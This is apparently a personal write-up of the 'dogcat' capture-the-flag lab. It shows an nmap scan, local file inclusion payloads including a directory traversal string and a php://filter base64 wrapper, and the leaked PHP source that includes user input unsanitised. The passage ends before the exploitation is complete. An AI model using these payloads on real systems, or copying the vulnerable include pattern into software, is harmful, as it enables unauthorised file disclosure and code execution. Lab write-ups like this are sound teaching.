<h1 align="center">dogcat </h1>

<p align="center">
  <img src="assets/dogcat.png" width="90" height="90"/>
</p>

<p align="center"> <b>Difficulty</b>: ?/10 (???) <b>Completed</b>:  ✔️ </p>

I felt like doing another Web Exploitation challenge. This one lets you look at pictures of dogs and/or cats. We will also exploit a PHP application via LFI and break out of a docker container. Sounds like a possibility to learn some new exploitation techniques, so I start the machine.

## What is flag 1?
To start I do the usual Network Reconnaissance with nmap.

```
root@ip-10-113-113-206:~# nmap -sV -p- 10.113.153.92
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-10-12 14:28 UTC
Nmap scan report for ip-10-113-153-92.eu-central-1.compute.internal (10.113.153.92)
Host is up (0.00017s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.09 seconds
```

Checking the webpage on port 80 seems to be the only real option we have as of now.

<img width="863" height="354" alt="Bildschirmfoto vom 2026-10-12 16-31-27" src="https://github.com/user-attachments/assets/ca130e67-f6f8-4af4-86ee-61e5b5c539ed" />

I want to see a dog.

<img width="861" height="893" alt="grafik" src="https://github.com/user-attachments/assets/a68d9fae-9a3b-4a50-89e6-df13881b8117" />

Notice how the URL changed after clicking on the button? We seem to be dealing with a Local File Inclusion vulnerability. We might be able to tamper with it to get some unwanted results. Unfortunately trying to traverse through the file directory didn't help. I tried using payloads like `/?view=../../../../var/www/html/flag` to figure out the file path structure, in the hopes of reading sensitive files. We get the output:

```
Sorry, only dogs or cats are allowed. 
```

While this didn't exactly lead to results, falsely writing `dogs` in the `view=` parameter revealed an interesting error message.

```
Warning: include(dogs.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24

Warning: include(): Failed opening 'dogs.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24
```
This gives us a big hint on the input validation. Including the string "cat" or "dog" might be necessary to give any sort of interesting output. I need more information so I decide to use the php filter stream wrapper `php://filter/dog/convert.base64-encode/resource=index` to get access to the source code. After decoding the base64 string we get some interesting information.

```
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```

